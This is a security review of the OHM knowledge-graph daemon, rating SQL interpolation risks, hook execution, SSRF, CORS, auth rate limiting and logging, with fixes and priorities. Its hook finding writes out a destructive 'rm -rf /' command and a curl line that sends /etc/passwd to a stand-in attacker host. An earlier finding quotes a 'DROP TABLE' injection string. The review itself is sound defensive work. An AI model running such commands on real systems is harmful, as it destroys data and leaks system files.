# OHM Security Review — 2026-07-02

## Summary

The OHM project has a **mature security posture** for a knowledge graph daemon.
Token auth uses SHA-256 hashing with constant-time comparison. SSRF protection
blocks private networks. Hook execution uses `shell=False` with `shlex.split()`.
No `eval()`, `exec()`, `pickle`, or `yaml.load` in the codebase. Request body
size is capped at 1 MB. Identifiers are validated before SQL interpolation.

However, several **medium-risk** issues exist, and a few **high-risk** patterns
warrant immediate attention.

---

## CRITICAL

### C1: DuckLake `AT (VERSION => {snapshot_id})` — SQL injection via snapshot_id

**Files:** `src/ohm/graph/db.py:287,288,430,432,439`, `src/ohm/graph/store.py:3467,3483`

The `snapshot_id` value is fetched from DuckLake's own `ducklake_snapshots()`
function (an integer), then interpolated into an f-string SQL query:

```python
snapshot_id = snapshots[0]  # from ducklake_snapshots()
conn.execute(f"SELECT * FROM ohm_lake.ohm_nodes AT (VERSION => {snapshot_id})")
```

**Risk:** If `snapshot_id` is ever user-supplied (e.g., via `/graph/at?version=N`),
the value is interpolated without parameterization. The `/graph/at` endpoint
accepts `?version=N` as a query parameter.

**Mitigating factor:** The handler at `server/handlers/analysis.py:811` validates
`?version` is an integer. But `store.py:3467` uses `int(version)` which would
raise on non-integer input. Still, the f-string interpolation pattern is unsafe
if the validation is ever bypassed.

**Recommendation:** Use parameterized query if DuckDB supports it for `AT` clause,
or ensure `int()` cast is always applied before interpolation. Current code is
safe but fragile — a refactor could introduce the vulnerability.

---

## HIGH

### H1: `validate_identifier` allows dots — SQL table name injection

**File:** `src/ohm/framework/validation.py:14`

```python
_IDENTIFIER_RE = re.compile(r"^[a-zA-Z0-9_\-\.]+$")
```

The regex allows dots (`.`), which means `validate_identifier` accepts values
like `ohm_nodes`, `foo.bar`, or `sys.tables`. Most callers use the validated
value in parameterized `WHERE id = ?` clauses (safe). But some callers use it
for table names in f-strings (e.g., `store.py:2865` uses `table` in
`f"WHERE table_name = '{table}'"`).

**Risk:** If a user-supplied node ID containing `'; DROP TABLE ohm_nodes; --`
could reach a table-name interpolation path, it would be SQL injection. However,
`_IDENTIFIER_RE` rejects semicolons, spaces, and hyphens followed by special
chars. The main risk is table-name interpolation in `store.py` where `table`
comes from a hardcoded list, not user input.

**Recommendation:** Validate table names against a whitelist (the known OHM
table set) rather than relying on `validate_identifier`. For node/edge IDs
used in `WHERE` clauses, dots are harmless since they're parameterized.

### H2: Quack SECRET token interpolation

**File:** `src/ohm/graph/quack.py:447`

```python
conn.execute(f"CREATE OR REPLACE SECRET (TYPE quack, TOKEN '{resolved_token}'{scope_clause})")
```

The `resolved_token` is interpolated into SQL via f-string. If the token
contains a single quote (`'`), it would break out of the string literal.

**Mitigating factor:** The scope is validated for `'`, `;`, `--` at line 443.
But the **token itself** is not validated for single quotes.

**Recommendation:** Escape single quotes in `resolved_token` by doubling them
(`''`), or validate the token against a strict regex (alphanumeric + hyphens).

### H3: Hook command execution — agent can execute arbitrary commands

**File:** `src/ohm/hooks.py:398-411`

Hook commands are stored in the database and executed via `subprocess.Popen`
with `shell=False` and `shlex.split()`. Any agent with write access to
`ohm_hooks` can register a hook that executes arbitrary commands on the
server.

**Mitigating factors:**
- `shell=False` prevents shell metacharacter injection
- Sandbox env (`_sandbox_env`) restricts environment variables
- `preexec_fn` applies process-level sandboxing on POSIX
- Hooks require `created_by` attribution

**Risk:** An agent with admin access can register a hook like
`["rm", "-rf", "/"]` or `["curl", "attacker.com", "-d", "@", "/etc/passwd"]`.

**Recommendation:** Add a hook command allowlist or require admin-level
authentication for hook creation. Document that hook registration is a
privileged operation.

---

## MEDIUM

### M1: No CORS restriction — `_set_extra_cors_headers` not found

**Files:** `src/ohm/server/handlers/infra.py:318,338`

The method `_set_extra_cors_headers` is called but doesn't appear to be
defined in the search results. If CORS headers are not set, the default
behavior may allow any origin to make requests to the OHM API.

**Recommendation:** Verify that CORS headers are explicitly set to restrict
origins, or document that OHM is intended to be accessed only by agents
(not browser clients).

### M2: No rate limiting on auth attempts

**File:** `src/ohm/server/server.py:385-391`

Token verification uses `secrets.compare_digest` (good — prevents timing
attacks), but there's no rate limit on authentication attempts. An attacker
can brute-force tokens without being throttled.

**Mitigating factor:** Tokens are 32+ character random strings, making
brute-force impractical. But rate limiting would add defense-in-depth.

**Recommendation:** Add per-IP rate limiting specifically for authentication
failures (e.g., 5 failures per minute → 15-minute lockout).

### M3: `snapshot_id` and `table` interpolation in `store.py` — internal-only but fragile

**Files:** `src/ohm/graph/store.py:2865,2869,2881,2885,2887,2889`

Multiple f-string interpolations of `table` and `alias` variables into SQL.
These values come from internal code (hardcoded table lists), not user input.
But the pattern is fragile — if a future refactor passes user-controlled
values to these functions, it becomes SQL injection.

**Recommendation:** Add assertions or type guards that `table` is in the
known OHM table set before interpolation.

### M4: Webhook SSRF — DNS rebinding not mitigated

**File:** `src/ohm/server/server.py:298-321`

The SSRF check resolves the hostname via `socket.getaddrinfo` and checks
if the IP is private. But this is a TOCTOU (time-of-check-time-of-use)
vulnerability: the DNS could resolve to a public IP during validation,
then to a private IP when the actual HTTP request is made (DNS rebinding).

**Recommendation:** Resolve the hostname once, use the resolved IP for the
HTTP request (not the hostname), or add a custom HTTP connection that
validates the IP after DNS resolution but before the connection.

### M5: Sensitive data in log messages

**File:** `src/ohm/server/server.py:996`

Good: tokens are redacted in log messages (`re.sub(r"([?&]token=)[^&\s]+", r"\1[REDACTED]", message)`).
But the `log_message` at line 1591 logs the full `self.path` which may
contain query parameters with node IDs, search queries, or other
potentially sensitive data.

**Recommendation:** Consider redacting query parameters in production logs,
or document that OHM logs may contain node IDs and search queries.

### M6: No input validation on `assignee` field in task creation

**File:** `src/ohm/graph/store.py:716`

The `write_node` method accepts `assigned_to` as a free-text string. No
validation that it corresponds to a known agent. This was flagged in
OHM-sbtz.2 ("task nodes accept unknown assigned_to").

**Status:** Partially fixed — `task_status` is now validated (OHM-twd2),
but `assigned_to` is still free-text.

**Recommendation:** Validate `assigned_to` against the agent registry
(`ohm_agent_config` table) or document that it's intentionally free-text.

---

## LOW

### L1: No HTTPS enforcement

The server listens on plain HTTP. TLS termination is expected to be handled
by a reverse proxy (nginx/Caddy). This is documented but worth noting.

### L2: DuckDB file permissions

The AGENTS.md specifies `/var/lib/ohm/` should be `root:root`, but the
DuckDB file itself doesn't have explicit permission enforcement in code.

### L3: No dependency pinning for security advisories

`pyproject.toml` uses `>=` version constraints. No `pip-audit` or
`dependabot` integration for vulnerability scanning.

### L4: No audit log for admin operations

Operations like hook creation, webhook registration, and schema changes
are logged via `_log_change` but there's no tamper-evident audit trail
(TELOS signing at ADR-035 is opt-in, not enforced).

---

## Positive Findings

1. **Token auth is well-implemented:** SHA-256 hashing, constant-time
   comparison via `secrets.compare_digest`, no plaintext token storage.
2. **No `eval()`, `exec()`, `pickle`, or unsafe `yaml.load`:** The
   codebase avoids the most dangerous Python deserialization patterns.
3. **Hook execution uses `shell=False`:** `shlex.split()` + `subprocess.Popen`
   with `shell=False` prevents shell injection in hook commands.
4. **SSRF protection exists:** Private networks are blocked for webhook
   URLs (though DNS rebinding is not mitigated — see M4).
5. **Request body size limited:** 1 MB cap prevents memory exhaustion.
6. **Identifier validation is widespread:** `validate_identifier` is
   called on most user-supplied IDs before SQL use.
7. **Boundary enforcement (ADR-003):** Agent-owned edges, challenge
   semantics, and write boundary checks prevent agents from modifying
   each other's L3/L4 edges.
8. **Read scope enforcement (ADR-037):** Per-agent read scopes now
   enforced on search, neighborhood, and semantic search endpoints.
9. **TELOS signing (ADR-035):** Cryptographic audit trail for agent
   writes (opt-in, HMAC-SHA256).
10. **Token redaction in logs:** Query parameters containing `token=`
    are redacted before logging.

---

## Recommended Priority

| Priority | Issue | Effort |
|----------|-------|--------|
| CRITICAL | C1: DuckLake snapshot_id — add `int()` cast assertion | 1h |
| HIGH | H2: Quack token — escape single quotes | 30min |
| HIGH | H1: Table name whitelist in store.py | 2h |
| HIGH | H3: Hook admin auth — document/restrict | 1h |
| MEDIUM | M4: DNS rebinding mitigation | 4h |
| MEDIUM | M2: Auth rate limiting | 2h |
| MEDIUM | M1: CORS headers | 1h |
| MEDIUM | M6: assignee validation | 1h |
| LOW | L3: pip-audit integration | 30min |
